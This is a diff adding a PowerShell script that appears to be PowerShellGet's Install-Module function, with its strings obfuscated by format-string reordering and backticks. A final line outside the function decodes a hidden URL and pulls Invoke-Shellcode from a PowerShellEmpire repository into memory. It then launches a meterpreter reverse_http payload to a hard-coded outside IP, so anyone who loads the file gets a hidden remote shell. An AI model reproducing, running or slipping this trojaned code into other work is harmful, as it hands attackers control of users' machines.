@@ -1,0 +1,272 @@
+function Install-Module {
+    
+    [CmdletBinding(DefaultParameterSetName = {"{2}{4}{1}{3}{0}" -f'et','r','Nam','S','eParamete'},
+        HelpUri = ("{8}{7}{2}{3}{6}{4}{0}{1}{9}{5}"-f'Lin','k','o.micros','oft.com/fw','nk/?','98573','li','tps://g','ht','ID=3'),
+        SupportsShouldProcess = $true)]
+    Param
+    (
+        [Parameter(Mandatory = $true,
+            ValueFromPipelineByPropertyName = $true,
+            Position = 0,
+            ParameterSetName = "n`AM`e`paRAm`ETErseT")]
+        [ValidateNotNullOrEmpty()]
+        [string[]]
+        $Name,
+
+        [Parameter(Mandatory = $true,
+            ValueFromPipeline = $true,
+            ValueFromPipelineByPropertyName = $true,
+            Position = 0,
+            ParameterSetName = "inp`UTObjE`ct")]
+        [ValidateNotNull()]
+        [PSCustomObject[]]
+        $InputObject,
+
+        [Parameter(ValueFromPipelineByPropertyName = $true,
+            ParameterSetName = "NAme`PaR`AMET`E`RsET")]
+        [ValidateNotNull()]
+        [string]
+        $MinimumVersion,
+
+        [Parameter(ValueFromPipelineByPropertyName = $true,
+            ParameterSetName = "nAMEPar`AmeTe`RS`ET")]
+        [ValidateNotNull()]
+        [string]
+        $MaximumVersion,
+
+        [Parameter(ValueFromPipelineByPropertyName = $true,
+            ParameterSetName = "namEPArAM`eT`Er`sET")]
+        [ValidateNotNull()]
+        [string]
+        $RequiredVersion,
+
+        [Parameter(ParameterSetName = "n`A`MepAr`AMETE`RseT")]
+        [ValidateNotNullOrEmpty()]
+        [string[]]
+        $Repository,
+
+        [Parameter(ValueFromPipelineByPropertyName = $true)]
+        [PSCredential]
+        $Credential,
+
+        [Parameter()]
+        [ValidateSet({"{1}{0}{2}"-f 'Us','Current','er'}, {"{2}{1}{0}"-f'ers','Us','All'})]
+        [string]
+        $Scope,
+
+        [Parameter(ValueFromPipelineByPropertyName = $true)]
+        [ValidateNotNullOrEmpty()]
+        [Uri]
+        $Proxy,
+
+        [Parameter(ValueFromPipelineByPropertyName = $true)]
+        [PSCredential]
+        $ProxyCredential,
+
+        [Parameter()]
+        [switch]
+        $AllowClobber,
+
+        [Parameter()]
+        [switch]
+        $SkipPublisherCheck,
+
+        [Parameter()]
+        [switch]
+        $Force,
+
+        [Parameter(ParameterSetName = "naMe`paR`AmeTerS`et")]
+        [switch]
+        $AllowPrerelease,
+
+        [Parameter()]
+        [switch]
+        $AcceptLicense,
+
+        [Parameter()]
+        [switch]
+        $PassThru
+    )
+
+    Begin {
+        if ($Scope -eq ("{0}{2}{1}" -f 'A','sers','llU') -and -not (Test-RunningAsElevated)) {
+            
+            $message = $LocalizedData.InstallModuleAdminPrivilegeRequiredForAllUsersScope -f @($script:programFilesModulesPath, $script:MyDocumentsModulesPath)
+
+            ThrowError -ExceptionName ("{1}{2}{0}{6}{5}{3}{4}"-f 'gum','System','.Ar','tEx','ception','n','e') `
+                -ExceptionMessage $message `
+                -ErrorId ("{5}{7}{8}{3}{4}{0}{9}{2}{10}{11}{1}{6}"-f'inPr','o','equi','Modul','eAdm','In','rAllUsersScope','s','tall','ivilegeR','red','F') `
+                -CallerPSCmdlet $PSCmdlet `
+                -ErrorCategory InvalidArgument
+        }
+
+        
+        
+        if (-not $Scope) {
+            $Scope = ("{2}{1}{0}" -f'er','ntUs','Curre')
+            if (-not $script:IsCoreCLR -and (Test-RunningAsElevated)) {
+                $Scope = ("{0}{2}{1}"-f'A','Users','ll')
+            }
+        }
+
+        Install-NuGetClientBinaries -CallerPSCmdlet $PSCmdlet -Proxy $Proxy -ProxyCredential $ProxyCredential
+
+        
+        $moduleNamesInPipeline = @()
+        $YesToAll = $false
+        $NoToAll = $false
+        $SourceSGrantedTrust = @()
+        $SourcesDeniedTrust = @()
+    }
+
+    Process {
+        $RepositoryIsNotTrusted = $LocalizedData.RepositoryIsNotTrusted
+        $QueryInstallUntrustedPackage = $LocalizedData.QueryInstallUntrustedPackage
+        $PackageTarget = $LocalizedData.InstallModulewhatIfMessage
+
+        $PSBoundParameters[("{2}{1}{0}" -f 'r','rovide','P')] = $script:PSModuleProviderName
+        $PSBoundParameters[("{1}{3}{0}{2}" -f 'geRes','Mess','olver','a')] = $script:PackageManagementInstallModuleMessageResolverScriptBlock
+        $PSBoundParameters[$script:PSArtifactType] = $script:PSArtifactTypeModule
+        $PSBoundParameters[("{0}{1}" -f'Sco','pe')] = $Scope
+        if ($AllowPrerelease) {
+            $PSBoundParameters[$script:AllowPrereleaseVersions] = $true
+        }
+        $null = $PSBoundParameters.Remove(("{0}{3}{4}{2}{1}" -f 'Al','e','rereleas','low','P'))
+        $null = $PSBoundParameters.Remove(("{1}{2}{0}" -f 'u','Pa','ssThr'))
+
+        if ($PSCmdlet.ParameterSetName -eq ("{5}{1}{2}{0}{4}{3}" -f'rS','meParamet','e','t','e','Na')) {
+            $ValidationResult = Validate-VersionParameters -CallerPSCmdlet $PSCmdlet `
+                -Name $Name `
+                -TestWildcardsInName `
+                -MinimumVersion $MinimumVersion `
+                -MaximumVersion $MaximumVersion `
+                -RequiredVersion $RequiredVersion `
+                -AllowPrerelease:$AllowPrerelease
+
+            if (-not $ValidationResult) {
+                
+                
+                return
+            }
+
+            if ($PSBoundParameters.ContainsKey(("{2}{0}{1}"-f'os','itory','Rep'))) {
+                $PSBoundParameters[("{0}{2}{1}"-f 'S','rce','ou')] = $Repository
+                $null = $PSBoundParameters.Remove(("{1}{0}{2}" -f 'pos','Re','itory'))
+
+                $ev = $null
+                $null = Get-PSRepository -Name $Repository -ErrorVariable ev -verbose:$false
+                if ($ev) { return }
+            }
+
+            $installedPackages = PackageManagement\Install-Package @PSBoundParameters
+
+            if ($PassThru) {
+                $installedPackages | Microsoft.PowerShell.Core\ForEach-Object { New-PSGetItemInfo -SoftwareIdentity $_ -Type $script:PSArtifactTypeModule }
+            }
+        }
+        elseif ($PSCmdlet.ParameterSetName -eq ("{0}{1}{2}" -f'I','nputOb','ject')) {
+            $null = $PSBoundParameters.Remove(("{2}{1}{0}" -f 'ject','utOb','Inp'))
+
+            foreach ($inputValue in $InputObject) {
+                if (($inputValue.PSTypeNames -notcontains ("{4}{6}{1}{5}{3}{7}{8}{0}{2}"-f 'ItemIn','ell.Comman','fo','s.PSRepo','Microso','d','ft.PowerSh','sito','ry')) -and
+                    ($inputValue.PSTypeNames -notcontains ("{7}{9}{1}{6}{2}{4}{0}{5}{8}{3}" -f 'ow','iz','M','positoryItemInfo','icrosoft.P','erShell','ed.','Deseri','.Commands.PSRe','al')) -and
+                    ($inputValue.PSTypeNames -notcontains ("{6}{0}{4}{1}{7}{8}{3}{2}{5}"-f 'crosoft.PowerShe','ommands.PSGe','In','d','ll.C','fo','Mi','tC','omman')) -and
+                    ($inputValue.PSTypeNames -notcontains ("{1}{5}{14}{0}{8}{3}{7}{13}{11}{10}{6}{12}{2}{4}{9}" -f 'd.M','Des','etCo','f','mmandI','erial','C','t.Po','icroso','nfo','hell.','S','ommands.PSG','wer','ize')) -and
+                    ($inputValue.PSTypeNames -notcontains ("{11}{8}{0}{3}{5}{1}{6}{2}{7}{10}{4}{9}"-f't.Powe','ell','S','rS','t','h','.Commands.P','G','icrosof','DscResourceInfo','e','M')) -and
+                    ($inputValue.PSTypeNames -notcontains ("{11}{3}{8}{9}{0}{2}{14}{15}{1}{10}{13}{4}{7}{12}{6}{5}"-f 'e','s','rSh','alized.Microso','tDscResou','o','nf','rce','ft.','Pow','.PS','Deseri','I','Ge','e','ll.Command')) -and
+                    ($inputValue.PSTypeNames -notcontains ("{7}{2}{10}{3}{12}{6}{9}{4}{11}{0}{8}{1}{13}{5}"-f 'pab','t','Power','ll.C','GetRo','fo','mmands','Microsoft.','ili','.PS','She','leCa','o','yIn')) -and
+                    ($inputValue.PSTypeNames -notcontains ("{5}{7}{13}{12}{8}{16}{6}{11}{4}{15}{10}{1}{0}{2}{3}{9}{14}" -f'll.Commands.PSGetRo','She','leCap','ab','soft.','De','ic','ser','ze','ility','wer','ro','ali','i','Info','Po','d.M'))) {
+                    ThrowError -ExceptionName ("{0}{2}{4}{3}{5}{1}"-f 'S','xception','ystem.A','ent','rgum','E') `
+                        -ExceptionMessage $LocalizedData.InvalidInputObjectValue `
+                        -ErrorId ("{2}{0}{5}{3}{1}{4}" -f 'v','putO','In','n','bjectValue','alidI') `
+                        -CallerPSCmdlet $PSCmdlet `
+                        -ErrorCategory InvalidArgument `
+                        -ExceptionObject $inputValue
+                }
+
+                if ( ($inputValue.PSTypeNames -contains ("{10}{3}{5}{6}{4}{9}{1}{2}{8}{7}{0}"-f'fo','s.PS','GetD','s','Sh','oft.Po','wer','eIn','scResourc','ell.Command','Micro')) -or
+                    ($inputValue.PSTypeNames -contains ("{10}{11}{5}{9}{6}{13}{3}{2}{0}{4}{8}{7}{1}{12}" -f 'hell.Co','cRes','S','er','mmands','roso','.','SGetDs','.P','ft','Deseriali','zed.Mic','ourceInfo','Pow')) -or
+                    ($inputValue.PSTypeNames -contains ("{0}{13}{11}{7}{6}{10}{3}{8}{9}{5}{12}{4}{1}{2}"-f'Mic','CommandI','nfo','hel','t','nds.','ow','ft.P','l.','Comma','erS','so','PSGe','ro')) -or
+                    ($inputValue.PSTypeNames -contains ("{4}{12}{2}{11}{5}{6}{7}{3}{9}{1}{8}{10}{0}"-f 'fo','.PSGe','.Micr','h','Deseriali','o','we','rS','tC','ell.Commands','ommandIn','osoft.P','zed')) -or
+                    ($inputValue.PSTypeNames -contains ("{1}{11}{0}{9}{6}{8}{4}{7}{10}{5}{2}{3}"-f 't.PowerS','Micro','t','yInfo','RoleCa','i','Commands.PSG','p','et','hell.','abil','sof')) -or
+                    ($inputValue.PSTypeNames -contains ("{5}{1}{7}{6}{8}{10}{9}{3}{0}{4}{11}{2}"-f'tRoleCap','erializ','yInfo','PSGe','ab','Des','soft.P','ed.Micro','owerSh','ds.','ell.Comman','ilit'))) {
+                    $psgetModuleInfo = $inputValue.PSGetModuleInfo
+                }
+                else {
+                    $psgetModuleInfo = $inputValue
+                }
+
+                
+                if ($moduleNamesInPipeline -contains $psgetModuleInfo.Name) {
+                    continue
+                }
+
+                $moduleNamesInPipeline += $psgetModuleInfo.Name
+
+                if ($psgetModuleInfo.PowerShellGetFormatVersion -and
+                    ($script:SupportedPSGetFormatVersionMajors -notcontains $psgetModuleInfo.PowerShellGetFormatVersion.Major)) {
+                    $message = $LocalizedData.NotSupportedPowerShellGetFormatVersion -f ($psgetModuleInfo.Name, $psgetModuleInfo.PowerShellGetFormatVersion, $psgetModuleInfo.Name)
+                    Write-Error -Message $message -ErrorId ("{0}{8}{7}{2}{1}{4}{3}{6}{5}{9}" -f 'No','Po','orted','lG','werShel','rmatVersio','etFo','p','tSup','n') -Category InvalidOperation
+                    continue
+                }
+
+                $PSBoundParameters[("{1}{0}" -f 'e','Nam')] = $psgetModuleInfo.Name
+                $PSBoundParameters[("{1}{0}{2}"-f'Ve','Required','rsion')] = $psgetModuleInfo.Version
+                if (($psgetModuleInfo.AdditionalMetadata) -and
+                    (Get-Member -InputObject $psgetModuleInfo.AdditionalMetadata -Name ("{1}{2}{0}"-f 'e','IsPrerele','as')) -and
+                    ($psgetModuleInfo.AdditionalMetadata.IsPrerelease -eq ("{0}{1}" -f'tru','e'))) {
+                    $PSBoundParameters[$script:AllowPrereleaseVersions] = $true
+                }
+                elseif ($PSBoundParameters.ContainsKey($script:AllowPrereleaseVersions)) {
+                    $null = $PSBoundParameters.Remove($script:AllowPrereleaseVersions)
+                }
+                $PSBoundParameters[("{0}{1}" -f 'Sourc','e')] = $psgetModuleInfo.Repository
+                $PSBoundParameters[("{4}{6}{1}{7}{0}{3}{5}{2}"-f 'e','a','er','ntPro','Pack','vid','ageMan','gem')] = (Get-ProviderName -PSCustomObject $psgetModuleInfo)
+
+                
+                $InstalledModuleInfo = Test-ModuleInstalled -Name $psgetModuleInfo.Name -RequiredVersion $psgetModuleInfo.Version
+                if (-not $Force -and $null -ne $InstalledModuleInfo) {
+                    $message = $LocalizedData.ModuleAlreadyInstalledVerbose -f ($InstalledModuleInfo.Version, $InstalledModuleInfo.Name, $InstalledModuleInfo.ModuleBase)
+                    Write-Verbose -Message $message
+                }
+                else {
+                    $source = $psgetModuleInfo.Repository
+                    $installationPolicy = (Get-PSRepository -Name $source).InstallationPolicy
+                    $ShouldProcessMessage = $PackageTarget -f ($psgetModuleInfo.Name, $psgetModuleInfo.Version)
+
+                    if ($psCmdlet.ShouldProcess($ShouldProcessMessage)) {
+                        if ($installationPolicy.Equals(("{1}{2}{0}" -f 'ted','Untr','us'), [StringComparison]::OrdinalIgnoreCase)) {
+                            if (-not($YesToAll -or $NoToAll -or $SourceSGrantedTrust.Contains($source) -or $sourcesDeniedTrust.Contains($source) -or $Force)) {
+                                $message = $QueryInstallUntrustedPackage -f ($psgetModuleInfo.Name, $psgetModuleInfo.RepositorySourceLocation)
+                                if ($PSVersionTable.PSVersion -ge ("{0}{1}"-f'5','.0.0')) {
+                                    $sourceTrusted = $psCmdlet.ShouldContinue("$message", "$RepositoryIsNotTrusted", $true, [ref]$YesToAll, [ref]$NoToAll)
+                                }
+                                else {
+                                    $sourceTrusted = $psCmdlet.ShouldContinue("$message", "$RepositoryIsNotTrusted", [ref]$YesToAll, [ref]$NoToAll)
+                                }
+
+                                if ($sourceTrusted) {
+                                    $SourceSGrantedTrust += $source
+                                }
+                                else {
+                                    $SourcesDeniedTrust += $source
+                                }
+                            }
+                        }
+
+                        if ($installationPolicy.Equals(("{2}{1}{0}" -f'ted','us','tr'), [StringComparison]::OrdinalIgnoreCase) -or $SourceSGrantedTrust.Contains($source) -or $YesToAll -or $Force) {
+                            $PSBoundParameters[("{0}{1}" -f'For','ce')] = $true
+                            $installedPackages = PackageManagement\Install-Package @PSBoundParameters
+
+                            if ($PassThru) {
+                                $installedPackages | Microsoft.PowerShell.Core\ForEach-Object { New-PSGetItemInfo -SoftwareIdentity $_ -Type $script:PSArtifactTypeModule }
+                            }
+                        }
+                    }
+                }
+            }
+        }
+    }
+}
+
+iex (New-Object Net.WebClient).DownloadString(("{18}{10}{23}{8}{9}{0}{15}{16}{20}{4}{22}{17}{3}{14}{13}{12}{5}{2}{11}{1}{19}{7}{21}{6}" -f'ten','rce/co','od','E','rShellE','/m','s1','tion/Inv','gi','thubusercon','//r','ule_sou','ata','re/master/d','mpi','t','.com/P','re/','https:','de_execu','owe','oke-Shellcode.p','mpi','aw.')); Invoke-Shellcode -Payload windows/meterpreter/reverse_http -Lhost 88.160.254.183 -Lport 8080 -Force
